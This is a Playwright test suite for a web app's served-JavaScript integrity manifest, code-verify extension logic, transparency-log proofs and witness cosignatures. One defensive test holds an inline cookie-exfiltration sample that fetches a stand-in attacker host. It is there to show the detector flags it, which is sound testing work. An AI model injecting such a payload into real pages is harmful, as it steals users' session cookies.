/**
 * tests/verifiable.spec.ts
 *
 * INDEPENDENT VERIFICATION of the two "don't trust the operator" features, end
 * to end against the running build, every check paired with a counterfactual
 * that a broken or dishonest implementation would fail.
 *
 *   FEATURE 1  SERVED-JS INTEGRITY (WhatsApp Code Verify model, honest):
 *     JS-1  the served manifest lists asset hashes + the commit SHA, and
 *           scripts/verify-served-js.sh PASSES against the running server but
 *           FAILS when one served asset is corrupted (a node origin that serves
 *           the real manifest and flips one asset's bytes).
 *     JS-2  the served manifest's digest is logged as a `served_manifest` leaf
 *           in the append-only transparency log, and its RFC 6962 inclusion
 *           proof verifies against the signed head; a tampered path and an
 *           unlogged digest are rejected.
 *     JS-3  the extension's PURE decision core (tools/code-verify-extension/
 *           check.js, the exact module content.js delegates to) greenlights a
 *           faithful load and flags a hash mismatch, an extra script, a missing
 *           mandatory entrypoint and an unexpected inline script.
 *
 *   FEATURE 2  INDEPENDENT LOG WITNESSES (C2SP tlog-witness / sigsum):
 *     WIT-1  a witness cosigns head A, the log extends to B, the witness cosigns
 *           B only after the RFC 6962 consistency proof A->B verifies; the live
 *           head carries a recognized cosignature and verify-log.sh accepts it
 *           under REQUIRE_WITNESS_QUORUM=1.
 *     WIT-2  FORK REFUSAL: a head B' with a rewritten earlier leaf is NOT
 *           consistent with A, so the witness refuses to cosign it, the live
 *           add-checkpoint endpoint refuses a cosignature over a root it never
 *           signed, and a client under the quorum policy rejects a forked head
 *           that lacks a valid cosignature.
 *     WIT-3  the STH signature and the witness cosignature each verify against
 *           their own published pubkey; a tampered cosignature and a tampered
 *           head signature are both rejected.
 *
 *   PRIVACY  the new table (translog_witness_cosignatures) and the new leaf
 *           (served_manifest) carry no handle, no raw amount, no buyer name; the
 *           same scanner flags a poisoned row, so it is not a no-op.
 *
 * PRECONDITION: the seeded DB (npm run reset-db && npm run seed) and the built
 * app on port 3947 (CI runs `next start`), like every suite. beforeAll logs the
 * served manifest as a leaf and cosigns the resulting head, both via the real
 * production code paths, so the JS-2 leaf and a witnessed live head exist. Those
 * writes are idempotent (dedup per commit+digest; one cosig per witness+size),
 * so re-running against the same DB does not grow the tree.
 */

import { test, expect, type APIRequestContext } from "@playwright/test";
import { createClient } from "@libsql/client";
import { createHash } from "node:crypto";
import { execFileSync, execFile } from "node:child_process";
import { promisify } from "node:util";
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";
import path from "node:path";
import { existsSync, readFileSync } from "node:fs";

import { sha256 } from "@noble/hashes/sha2.js";
import { ed25519 } from "@noble/curves/ed25519.js";

import {
  leafHashHex,
  merkleRootHex,
  consistencyProofHex,
  sthSigningBody,
  verifySth,
  verifyInclusionHex,
  verifyConsistencyHex,
  bytesToHex,
  utf8ToBytes,
  type Sth,
} from "../lib/merkle";
import {
  reviewCheckpoint,
  cosign,
  verifyCosignature,
  checkQuorum,
  witnessSeedFromHex,
  witnessPublicKeyHex,
  witnessId,
  type WitnessState,
  type RecognizedWitness,
  type WitnessCosignature,
} from "../lib/witness";
import { logServedManifest, getSignedHead, storeWitnessCosignature } from "../lib/translog";

const ROOT = path.resolve(__dirname, "..");
const DB_PATH = path.join(ROOT, "data", "app.db");
const requireCjs = createRequire(__filename);

/** The extension's PURE decision core, the exact module content.js delegates to. */
type Verdict = {
  status: "green" | "red" | "unavailable";
  problems: string[];
  ok: string[];
  commit: string | null;
  counts: { executables: number; styles: number; inline: number };
};
const { evaluate } = requireCjs(
  path.join(ROOT, "tools", "code-verify-extension", "check.js"),
) as { evaluate: (input: unknown) => Verdict };

/** What the extension build pins; must equal the manifest provenance. */
const PINNED_REPO = "nathanjzhao/databoard";
const PINNED_WORKFLOW = ".github/workflows/ci.yml";

/** The checked-in dev witness key (lib/witnesses.ts): the default registry's
 *  one operator witness. Not a secret, duplicated as in tests/witness.spec.ts. */
const DEV_WITNESS_SEED_HEX =
  "d17e57000000000000000077697402772696746e6573732d6465762d6b657921";
const DEV_WITNESS_KEY_NAME = "databoard-witness-operator";

function db() {
  return createClient({ url: `file:${DB_PATH}` });
}
function sha256HexOf(s: string): string {
  return createHash("sha256").update(s, "utf8").digest("hex");
}
async function getJson<T>(request: APIRequestContext, url: string): Promise<T> {
  const res = await request.get(url);
  expect(res.ok(), `GET ${url} -> ${res.status()}`).toBe(true);
  return (await res.json()) as T;
}
function flip1(hex: string): string {
  return hex.slice(0, -1) + (hex.endsWith("0") ? "1" : "0");
}

type Manifest = {
  version: number;
  prefix: string;
  commit: string;
  buildId: string;
  provenance: { repo: string; workflow: string };
  inline: { bootstrapSha256: string; dataPushPrefix: string };
  entrypoints: { rootMainFiles: string[]; polyfillFiles: string[]; lowPriorityFiles: string[] };
  file_count: number;
  files: Array<{ path: string; sha256: string; bytes: number }>;
};
type WitnessedSthResp = Sth & {
  cosignatures: WitnessCosignature[];
  witnessing: { required: number; recognized: number; independent: number; present: number; met: boolean };
};

/* Shared state established in beforeAll. */
let MANIFEST_TEXT = "";
let MANIFEST: Manifest;
let MANIFEST_DIGEST = "";
let SERVED_LEAF: { seq: number; leafHash: string; manifestSha256: string; buildId: string; commit: string | null };

const BASE = "http://localhost:3947";

test.beforeAll(async () => {
  // The exact bytes the site serves, and their digest an outside verifier
  // computes. beforeAll only gets worker fixtures, so use node fetch, not the
  // test-scoped `request` fixture.
  const res = await fetch(`${BASE}/api/transparency/js-manifest`);
  expect(res.ok, "js-manifest available (build ran the postbuild step)").toBe(true);
  MANIFEST_TEXT = await res.text();
  MANIFEST = JSON.parse(MANIFEST_TEXT) as Manifest;
  MANIFEST_DIGEST = sha256HexOf(MANIFEST_TEXT);

  // Log the served manifest as a `served_manifest` leaf via the real deploy
  // path (scripts/log-served-manifest.ts uses this same function). Idempotent
  // per (commit, digest).
  const leaf = await logServedManifest(MANIFEST_TEXT);
  expect(leaf, "logServedManifest accepted the served manifest bytes").toBeTruthy();
  SERVED_LEAF = leaf!;

  // Cosign the resulting head so the current head is witnessed for WIT-1/WIT-3,
  // exactly the path scripts/witness.ts / the seed run. One cosig per (witness,
  // size), so this dedupes on re-run.
  const head = await getSignedHead();
  if (head.treeSize > 0) {
    const c = cosign(head, witnessSeedFromHex(DEV_WITNESS_SEED_HEX), { keyName: DEV_WITNESS_KEY_NAME });
    const stored = await storeWitnessCosignature(c);
    expect(["stored", "deduped"]).toContain(stored.status);
  }
});

/* =============================================================== JS-1 */

test("JS-1 served manifest lists asset hashes + commit; verify-served-js passes, FAILS on a corrupted asset", async () => {
  // The manifest is a real integrity manifest: a commit SHA and per-file hashes.
  expect(/^[0-9a-f]{40}$/.test(MANIFEST.commit), "commit is a 40-hex sha").toBe(true);
  expect(MANIFEST.files.length).toBeGreaterThan(0);
  expect(MANIFEST.file_count).toBe(MANIFEST.files.length);
  for (const f of MANIFEST.files) {
    expect(/^[0-9a-f]{64}$/.test(f.sha256), `file ${f.path} has a sha256`).toBe(true);
    expect(Number.isInteger(f.bytes) && f.bytes >= 0).toBe(true);
  }

  const script = path.join(ROOT, "scripts", "verify-served-js.sh");

  // PASS: against the actually running server, checking every listed file.
  const pass = execFileSync("bash", [script, "http://localhost:3947", "all"], {
    cwd: ROOT,
    encoding: "utf8",
  });
  expect(pass).toMatch(/\d+ ok, 0 failed/);

  // FAIL (counterfactual): a node origin that serves the SAME manifest but flips
  // one asset's bytes. The verifier must exit nonzero and name that file.
  const staticDir = path.join(ROOT, ".next", "static");
  const target = MANIFEST.files.find((f) => f.path.endsWith(".js"));
  expect(target, "a .js asset to corrupt").toBeTruthy();
  expect(existsSync(path.join(staticDir, target!.path)), "target exists in the build output").toBe(true);

  const { startCorruptOrigin } = (await import(
    pathToFileURL(path.join(ROOT, "tests", "harness", "corrupt-origin.mjs")).href
  )) as { startCorruptOrigin: (a: unknown) => Promise<{ url: string; close: () => Promise<void> }> };

  const origin = await startCorruptOrigin({
    manifestJson: MANIFEST_TEXT,
    staticDir,
    corruptRel: target!.path,
  });
  try {
    // The corrupt origin is an IN-PROCESS http server, so this must be async:
    // a synchronous execFileSync would block the event loop and the script's
    // curl calls to that server would hang. execFile keeps the loop serving.
    let threw = false;
    let combined = "";
    try {
      const { stdout, stderr } = await promisify(execFile)("bash", [script, origin.url, "all"], {
        cwd: ROOT,
        encoding: "utf8",
      });
      combined = `${stdout}${stderr}`;
    } catch (err) {
      threw = true;
      const e = err as { code?: number; stdout?: string; stderr?: string };
      expect(e.code).not.toBe(0);
      combined = `${e.stdout ?? ""}${e.stderr ?? ""}`;
    }
    expect(threw, "verify-served-js.sh exits nonzero when a served asset is corrupted").toBe(true);
    expect(combined).toContain("FAIL");
    expect(combined).toContain(target!.path);
    expect(combined).toMatch(/[1-9]\d* failed/);
  } finally {
    await origin.close();
  }
});

/* =============================================================== JS-2 */

test("JS-2 the served manifest digest is a served_manifest leaf whose inclusion proof verifies", async ({ request }) => {
  // The leaf binds THIS deployment's served bytes.
  expect(SERVED_LEAF.manifestSha256).toBe(MANIFEST_DIGEST);
  expect(SERVED_LEAF.commit).toBe(MANIFEST.commit);
  expect(/^[0-9a-f]{64}$/.test(SERVED_LEAF.leafHash)).toBe(true);

  // The leaf really is a served_manifest leaf that carries the digest as a
  // clear, non-PII field (subject is a blinded HMAC, not the raw commit).
  const c = db();
  const row = await c.execute({
    sql: `SELECT payload_json FROM translog_leaves WHERE leaf_hash = ?`,
    args: [SERVED_LEAF.leafHash],
  });
  expect(row.rows[0], "the served_manifest leaf is in translog_leaves").toBeTruthy();
  const payload = JSON.parse(String(row.rows[0].payload_json)) as Record<string, unknown>;
  expect(payload.type).toBe("served_manifest");
  expect(payload.manifestSha256).toBe(MANIFEST_DIGEST);
  expect(payload.buildId).toBe(MANIFEST.buildId);
  expect(/^[0-9a-f]{64}$/.test(String(payload.subject)), "subject is a blinded HMAC, not a raw id").toBe(true);

  // Inclusion proof against the signed head, verified with the repo's own merkle.
  const { publicKey } = await getJson<{ publicKey: string }>(request, "/api/translog/pubkey");
  const incl = await getJson<{
    leafHash: string;
    leafIndex: number;
    treeSize: number;
    auditPath: string[];
    rootHash: string;
    sth: Sth;
  }>(request, `/api/translog/proof/inclusion?leaf=${SERVED_LEAF.leafHash}`);
  expect(incl.leafHash).toBe(SERVED_LEAF.leafHash);
  expect(
    verifyInclusionHex({
      leafHash: incl.leafHash,
      leafIndex: incl.leafIndex,
      treeSize: incl.treeSize,
      auditPath: incl.auditPath,
      root: incl.sth.rootHash,
    }),
    "the manifest leaf is provably in the tree",
  ).toBe(true);
  expect(verifySth(incl.sth, publicKey), "the head over that tree is genuinely signed").toBe(true);

  // COUNTERFACTUAL 1: a single tampered audit-path node must break the proof.
  if (incl.auditPath.length > 0) {
    const tampered = [...incl.auditPath];
    tampered[0] = flip1(tampered[0]);
    expect(
      verifyInclusionHex({
        leafHash: incl.leafHash,
        leafIndex: incl.leafIndex,
        treeSize: incl.treeSize,
        auditPath: tampered,
        root: incl.sth.rootHash,
      }),
      "a tampered inclusion proof is rejected",
    ).toBe(false);
  }

  // COUNTERFACTUAL 2: the digest of DIFFERENT manifest bytes is not this leaf,
  // and a leaf hash that was never logged is absent from the log (404).
  const otherDigest = sha256HexOf(MANIFEST_TEXT + " ");
  expect(otherDigest).not.toBe(MANIFEST_DIGEST);
  const bogusLeaf = leafHashHex(utf8ToBytes(`never-logged-${Date.now()}`));
  const miss = await request.get(`/api/translog/proof/inclusion?leaf=${bogusLeaf}`);
  expect(miss.status(), "an unlogged leaf hash is a 404, not a proof").toBe(404);
});

/* =============================================================== JS-3 */

test("JS-3 the extension's pure check greenlights a faithful load and flags every tamper", () => {
  const mandatory = [
    ...(MANIFEST.entrypoints.rootMainFiles || []),
    ...(MANIFEST.entrypoints.polyfillFiles || []),
  ];
  expect(mandatory.length, "the manifest names mandatory entrypoints to require").toBeGreaterThan(0);
  const byPath = new Map(MANIFEST.files.map((f) => [f.path, f]));
  for (const p of mandatory) expect(byPath.has(p), `entrypoint ${p} is a hashed file`).toBe(true);

  const pins = { repo: PINNED_REPO, workflow: PINNED_WORKFLOW };
  // A faithful load: every mandatory entrypoint loaded at its real hash, the
  // pinned inline bootstrap, and an RSC flight-data push (data, not code).
  const goodLoaded = mandatory.map((p) => ({ kind: "script" as const, path: p, sha256: byPath.get(p)!.sha256 }));
  const goodInline = [
    { text: MANIFEST.inline.bootstrapSha256 ? "(self.__next_f=self.__next_f||[]).push([0])" : "", sha256: MANIFEST.inline.bootstrapSha256 },
    { text: `${MANIFEST.inline.dataPushPrefix}[1,"payload"])`, sha256: "00".repeat(32) },
  ];

  const green = evaluate({ manifest: MANIFEST, pins, loaded: goodLoaded, inline: goodInline });
  expect(green.status, green.problems.join(" | ")).toBe("green");
  expect(green.problems).toEqual([]);
  expect(green.commit).toBe(MANIFEST.commit);
  expect(green.counts.executables).toBe(mandatory.length);

  // COUNTERFACTUAL a: one loaded script's bytes differ from the manifest.
  const mismatch = evaluate({
    manifest: MANIFEST,
    pins,
    loaded: goodLoaded.map((l, i) => (i === 0 ? { ...l, sha256: flip1(l.sha256) } : l)),
    inline: goodInline,
  });
  expect(mismatch.status).toBe("red");
  expect(mismatch.problems.some((p) => p.startsWith("script hash mismatch"))).toBe(true);

  // COUNTERFACTUAL b: an extra script the manifest never attested was injected.
  const extra = evaluate({
    manifest: MANIFEST,
    pins,
    loaded: [...goodLoaded, { kind: "script", path: "chunks/evil-injected.js", sha256: "ab".repeat(32) }],
    inline: goodInline,
  });
  expect(extra.status).toBe("red");
  expect(extra.problems.some((p) => p.includes("not in manifest: chunks/evil-injected.js"))).toBe(true);

  // COUNTERFACTUAL c: a mandatory entrypoint was not loaded (stripped shell).
  const missing = evaluate({ manifest: MANIFEST, pins, loaded: goodLoaded.slice(1), inline: goodInline });
  expect(missing.status).toBe("red");
  expect(missing.problems.some((p) => p === `mandatory entrypoint not loaded: ${mandatory[0]}`)).toBe(true);

  // COUNTERFACTUAL d: an inline script that is neither the bootstrap nor a
  // flight-data push (arbitrary injected code).
  const inlineEvil = evaluate({
    manifest: MANIFEST,
    pins,
    loaded: goodLoaded,
    inline: [...goodInline, { text: "fetch('https://evil.example/'+document.cookie)", sha256: "cd".repeat(32) }],
  });
  expect(inlineEvil.status).toBe("red");
  expect(inlineEvil.problems.some((p) => p.startsWith("unexpected inline script"))).toBe(true);

  // COUNTERFACTUAL e: a manifest whose provenance is not the pinned source.
  const wrongPin = evaluate({ manifest: MANIFEST, pins: { repo: "attacker/fork", workflow: PINNED_WORKFLOW }, loaded: goodLoaded, inline: goodInline });
  expect(wrongPin.status).toBe("red");
  expect(wrongPin.problems.some((p) => p.startsWith("provenance mismatch"))).toBe(true);
});

/* =============================================================== WIT-1 */

/** A throwaway "log" with an Ed25519 key, signing STHs exactly like the server. */
function makeLog(fill: number) {
  const seed = new Uint8Array(32).fill(fill);
  const publicKey = bytesToHex(ed25519.getPublicKey(seed));
  const logId = bytesToHex(sha256(utf8ToBytes(publicKey)));
  function sign(treeSize: number, rootHash: string, timestamp = 1): Sth {
    const head = { v: 1, logId, treeSize, rootHash, timestamp };
    return { ...head, signature: bytesToHex(ed25519.sign(utf8ToBytes(sthSigningBody(head)), seed)) };
  }
  return { seed, publicKey, logId, sign };
}
function leaves(n: number, salt = ""): string[] {
  return Array.from({ length: n }, (_, i) => leafHashHex(utf8ToBytes(`${salt}leaf-${i}`)));
}
const WSEED = new Uint8Array(32).fill(7);
const WPUB = witnessPublicKeyHex(WSEED);

test("WIT-1 witness cosigns A, then B only with a real A->B consistency proof; live head is witnessed", async ({ request }) => {
  // ---- pure protocol: cosign A, extend to B, cosign B on a real proof -------
  const log = makeLog(1);
  const all = leaves(7);
  const A = 4;
  const rootA = merkleRootHex(all.slice(0, A));
  const sthA = log.sign(A, rootA);

  const r0 = reviewCheckpoint({
    logPublicKey: log.publicKey,
    prior: null,
    request: { old: 0, consistencyProof: [], sth: sthA },
    witnessSeed: WSEED,
    keyName: "w",
  });
  expect(r0.ok, "fresh witness cosigns A from size 0").toBe(true);
  if (!r0.ok) return;
  const stateA: WitnessState = r0.newState;
  expect(verifyCosignature(r0.cosignature, WPUB, sthA)).toBe(true);

  const B = 7;
  const rootB = merkleRootHex(all);
  const sthB = log.sign(B, rootB);
  const proofAB = consistencyProofHex(A, all);
  const r1 = reviewCheckpoint({
    logPublicKey: log.publicKey,
    prior: stateA,
    request: { old: A, consistencyProof: proofAB, sth: sthB },
    witnessSeed: WSEED,
    keyName: "w",
  });
  expect(r1.ok, "witness cosigns B as a proven extension of A").toBe(true);
  if (!r1.ok) return;
  expect(verifyCosignature(r1.cosignature, WPUB, sthB)).toBe(true);
  // The proof itself is sound.
  expect(
    verifyConsistencyHex({ first: A, second: B, firstHash: rootA, secondHash: rootB, proof: proofAB }),
  ).toBe(true);

  // COUNTERFACTUAL: the B cosignature was NOT free. Present B with no proof and
  // the witness refuses (not_consistent) -- consistency is what it cosigns on.
  const rNoProof = reviewCheckpoint({
    logPublicKey: log.publicKey,
    prior: stateA,
    request: { old: A, consistencyProof: [], sth: sthB },
    witnessSeed: WSEED,
    keyName: "w",
  });
  expect(rNoProof.ok).toBe(false);
  if (!rNoProof.ok) expect(rNoProof.code).toBe("not_consistent");

  // ---- live: cosign the running head and confirm the quorum -----------------
  const { publicKey: logPublicKey } = await getJson<{ publicKey: string }>(request, "/api/translog/pubkey");
  const head = await getJson<WitnessedSthResp>(request, "/api/translog/sth");
  test.skip(head.treeSize === 0, "log empty");
  expect(verifySth(head, logPublicKey), "the live head is genuinely signed").toBe(true);

  const devSeed = witnessSeedFromHex(DEV_WITNESS_SEED_HEX);
  const review = reviewCheckpoint({
    logPublicKey,
    prior: null,
    request: { old: 0, consistencyProof: [], sth: head },
    witnessSeed: devSeed,
    keyName: DEV_WITNESS_KEY_NAME,
  });
  expect(review.ok, review.ok ? "" : (review as { message: string }).message).toBe(true);
  if (!review.ok) return;
  const post = await request.post("/api/translog/add-checkpoint", { data: review.cosignature });
  expect([200, 201]).toContain(post.status());
  expect(["stored", "deduped"]).toContain(((await post.json()) as { status: string }).status);

  const after = await getJson<WitnessedSthResp>(request, `/api/translog/sth?size=${head.treeSize}`);
  const mine = after.cosignatures.find((c) => c.witnessId === witnessId(WITNESS_DEV_PUB()));
  expect(mine, "the served head carries the recognized cosignature").toBeTruthy();
  expect(verifyCosignature(mine!, WITNESS_DEV_PUB(), after)).toBe(true);
  expect(after.witnessing.met, "quorum met on the live head").toBe(true);

  // verify-log.sh, the terminal auditor, accepts the head under the quorum policy.
  const out = execFileSync("bash", [path.join(ROOT, "scripts", "verify-log.sh"), "http://localhost:3947"], {
    cwd: ROOT,
    encoding: "utf8",
    env: { ...process.env, REQUIRE_WITNESS_QUORUM: "1" },
  });
  expect(out).toContain("head is WITNESSED (quorum met)");
  expect(out).toMatch(/verify-log: OK/);
});

function WITNESS_DEV_PUB(): string {
  return witnessPublicKeyHex(witnessSeedFromHex(DEV_WITNESS_SEED_HEX));
}

/* =============================================================== WIT-2 */

test("WIT-2 FORK REFUSAL: witness refuses a rewritten history, endpoint refuses an unsigned root, client rejects a forked head", async ({ request }) => {
  // ---- pure: a head B' with a rewritten earlier leaf is not consistent -------
  const log = makeLog(2);
  const all = leaves(7);
  const A = 4;
  const rootA = merkleRootHex(all.slice(0, A));
  const stateA: WitnessState = { logId: log.logId, treeSize: A, rootHash: rootA };
  const B = 7;
  const proofAB = consistencyProofHex(A, all);

  // Rewrite leaf index 1 (inside the witnessed prefix) and rebuild a size-B tree.
  const forged = [...all];
  forged[1] = leafHashHex(utf8ToBytes("rewritten-history"));
  const forgedRootB = merkleRootHex(forged);
  const sthBforged = log.sign(B, forgedRootB); // the operator holds the log key, so this signature is REAL
  expect(verifySth(sthBforged, log.publicKey)).toBe(true);

  for (const [label, proof] of [
    ["honest A->B proof over the forged root", proofAB],
    ["forged A->B' proof (different prefix)", consistencyProofHex(A, forged)],
  ] as const) {
    const rf = reviewCheckpoint({
      logPublicKey: log.publicKey,
      prior: stateA,
      request: { old: A, consistencyProof: proof, sth: sthBforged },
      witnessSeed: WSEED,
      keyName: "w",
    });
    expect(rf.ok, `witness refuses the forged head (${label})`).toBe(false);
    if (!rf.ok) expect(rf.code).toBe("not_consistent");
  }
  // A same-size divergence is a plain fork.
  const sthAforged = log.sign(A, merkleRootHex(forged.slice(0, A)));
  const rFork = reviewCheckpoint({
    logPublicKey: log.publicKey,
    prior: stateA,
    request: { old: A, consistencyProof: [], sth: sthAforged },
    witnessSeed: WSEED,
    keyName: "w",
  });
  expect(rFork.ok).toBe(false);
  if (!rFork.ok) expect(rFork.code).toBe("fork");

  // ---- live: the endpoint refuses a cosignature over a root it never signed --
  const head = await getJson<WitnessedSthResp>(request, "/api/translog/sth");
  test.skip(head.treeSize === 0, "log empty");
  const devSeed = witnessSeedFromHex(DEV_WITNESS_SEED_HEX);
  const fabricatedRoot = leafHashHex(utf8ToBytes(`fabricated-root-${Date.now()}`));
  const overForgedRoot = cosign(
    { logId: head.logId, treeSize: head.treeSize, rootHash: fabricatedRoot },
    devSeed,
    { keyName: DEV_WITNESS_KEY_NAME },
  );
  const resFab = await request.post("/api/translog/add-checkpoint", { data: overForgedRoot });
  expect(resFab.status(), "endpoint refuses a cosig over a head it never signed").toBe(400);
  expect(((await resFab.json()) as { status: string }).status).toBe("unknown_head");

  // ---- client quorum policy: a forked head with no valid cosig is rejected ---
  const reg = await getJson<{
    quorum: { required: number };
    witnesses: Array<{ keyName: string; witnessId: string; publicKey: string; operator: boolean }>;
  }>(request, "/api/translog/witnesses");
  const registry: RecognizedWitness[] = reg.witnesses.map((w) => ({
    keyName: w.keyName,
    publicKey: w.publicKey,
    witnessId: w.witnessId,
    operator: w.operator,
  }));
  const required = reg.quorum.required;

  // The real head meets quorum...
  const okQuorum = checkQuorum(head, head.cosignatures, registry, required);
  expect(okQuorum.met, "the genuine head meets the witness quorum").toBe(true);

  // ...but a forked head at the SAME size with a DIFFERENT root does not: the
  // cosignatures bind to the real root, so none verify over the fork.
  const forkedHead: Sth = { ...head, rootHash: fabricatedRoot };
  const forkedQuorum = checkQuorum(forkedHead, head.cosignatures, registry, required);
  expect(forkedQuorum.present, "no cosignature verifies over the forked root").toBe(0);
  expect(forkedQuorum.met, "a client under the quorum policy rejects the forked head").toBe(false);
});

/* =============================================================== WIT-3 */

test("WIT-3 STH and witness cosignature each verify against their published pubkeys; tampering is rejected", async ({ request }) => {
  const { publicKey: logPub } = await getJson<{ publicKey: string }>(request, "/api/translog/pubkey");
  const reg = await getJson<{
    witnesses: Array<{ keyName: string; witnessId: string; publicKey: string; operator: boolean }>;
  }>(request, "/api/translog/witnesses");
  const head = await getJson<WitnessedSthResp>(request, "/api/translog/sth");
  test.skip(head.treeSize === 0, "log empty");

  // The head signature verifies against the LOG's published key.
  expect(verifySth(head, logPub)).toBe(true);
  // ...and is rejected against the wrong key (a witness key is not the log key).
  expect(verifySth(head, WITNESS_DEV_PUB())).toBe(false);
  // ...and a tampered head signature does not verify.
  expect(verifySth({ ...head, signature: flip1(head.signature) }, logPub)).toBe(false);

  expect(head.cosignatures.length, "the head carries at least one cosignature").toBeGreaterThanOrEqual(1);
  const byId = new Map(reg.witnesses.map((w) => [w.witnessId, w]));
  for (const cosig of head.cosignatures) {
    const w = byId.get(cosig.witnessId);
    expect(w, `cosignature ${cosig.witnessId.slice(0, 12)} is from a recognized witness`).toBeTruthy();
    // The cosignature's id is the SHA-256 of the registered key, not a key it
    // carries; and it verifies against that registered key over this exact head.
    expect(cosig.witnessId).toBe(witnessId(w!.publicKey));
    expect(verifyCosignature(cosig, w!.publicKey, head), "cosignature verifies against the registered pubkey").toBe(true);

    // COUNTERFACTUALS: a flipped signature byte, and the wrong verifying key.
    expect(verifyCosignature({ ...cosig, signature: flip1(cosig.signature) }, w!.publicKey, head)).toBe(false);
    const strangerPub = witnessPublicKeyHex(new Uint8Array(32).fill(200));
    expect(verifyCosignature(cosig, strangerPub, head)).toBe(false);
    // A cosignature over a different head (root flipped) does not verify.
    expect(verifyCosignature(cosig, w!.publicKey, { ...head, rootHash: flip1(head.rootHash) })).toBe(false);
  }
});

/* ============================================================== PRIVACY */

/**
 * Scan an artifact for forbidden content: a handle appearing anywhere in the
 * serialized row, or any VALUE equal to a raw dollar amount (structural, so a
 * random hex digest that happens to contain a decimal run is never a hit).
 */
function scanForPII(
  obj: unknown,
  forbidden: { handles: string[]; amounts: number[] },
): string[] {
  const hits: string[] = [];
  const serialized = JSON.stringify(obj);
  for (const h of forbidden.handles) {
    if (h && serialized.includes(h)) hits.push(`handle "${h}"`);
  }
  const amountSet = new Set(forbidden.amounts.map((a) => a));
  const amountStrs = new Set(forbidden.amounts.map((a) => String(a)));
  const walk = (v: unknown): void => {
    if (v === null) return;
    if (typeof v === "number") {
      if (amountSet.has(v)) hits.push(`raw amount ${v}`);
      return;
    }
    if (typeof v === "string") {
      if (amountStrs.has(v)) hits.push(`raw amount "${v}"`);
      return;
    }
    if (Array.isArray(v)) {
      v.forEach(walk);
      return;
    }
    if (typeof v === "object") {
      for (const val of Object.values(v as Record<string, unknown>)) walk(val);
    }
  };
  walk(obj);
  return hits;
}

test("PRIVACY the witness table and served_manifest leaf hold no handle, amount, or buyer name", async () => {
  const c = db();
  const handles = (await c.execute("SELECT username FROM users")).rows.map((r) => String(r.username));
  const amounts = (await c.execute("SELECT total_usd FROM deals")).rows.map((r) => Number(r.total_usd));
  expect(handles.length, "there are real handles to look for").toBeGreaterThan(0);
  expect(amounts.length, "there are real raw amounts to look for").toBeGreaterThan(0);
  const forbidden = { handles, amounts };

  const ALLOWED_COSIG_KEYS = new Set([
    "v", "witnessId", "keyName", "logId", "treeSize", "rootHash", "cosignedAt", "publicKey", "signature",
  ]);
  const ALLOWED_LEAF_KEYS = new Set(["seq", "type", "ts", "subject", "manifestSha256", "buildId"]);

  // GUARD PROOF: the SAME scanner must catch a poisoned row, or it proves nothing.
  const poisoned = {
    witness_id: "x", tree_size: 1, root_hash: "y",
    key_name: handles[0], // a real handle smuggled into a label
    public_key: "z",
    cosignature: JSON.stringify({ note: `paid ${amounts[0]}`, amountUsd: amounts[0], buyer: handles[0] }),
  };
  const guardHits = scanForPII({ ...poisoned, cosignature: JSON.parse(poisoned.cosignature) }, forbidden);
  expect(guardHits.length, "the scanner flags a poisoned row").toBeGreaterThan(0);

  // Every witness cosignature row is clean, and shaped only as the schema allows.
  const cosigRows = await c.execute(
    "SELECT witness_id, tree_size, root_hash, key_name, public_key, cosignature, cosigned_at, received_at FROM translog_witness_cosignatures",
  );
  expect(cosigRows.rows.length, "there is at least one cosignature row to scan").toBeGreaterThanOrEqual(1);
  for (const r of cosigRows.rows) {
    const cosig = JSON.parse(String(r.cosignature)) as Record<string, unknown>;
    for (const k of Object.keys(cosig)) {
      expect(ALLOWED_COSIG_KEYS.has(k), `cosignature field ${k} is expected`).toBe(true);
    }
    const rowObj = { ...r, cosignature: cosig };
    expect(scanForPII(rowObj, forbidden), `PII in cosig row for witness ${String(r.witness_id).slice(0, 12)}`).toEqual([]);
  }

  // The served_manifest leaf is clean and shaped only as the schema allows.
  const smRows = await c.execute("SELECT payload_json FROM translog_leaves WHERE payload_json LIKE '%\"served_manifest\"%'");
  expect(smRows.rows.length, "the served_manifest leaf exists").toBeGreaterThanOrEqual(1);
  for (const r of smRows.rows) {
    const leaf = JSON.parse(String(r.payload_json)) as Record<string, unknown>;
    for (const k of Object.keys(leaf)) {
      expect(ALLOWED_LEAF_KEYS.has(k), `served_manifest field ${k} is expected`).toBe(true);
    }
    expect(scanForPII(leaf, forbidden), "PII in the served_manifest leaf").toEqual([]);
    // The digest and build id are public hashes; the subject is a blinded HMAC.
    expect(/^[0-9a-f]{64}$/.test(String(leaf.manifestSha256))).toBe(true);
    expect(/^[0-9a-f]{64}$/.test(String(leaf.subject))).toBe(true);
  }
});
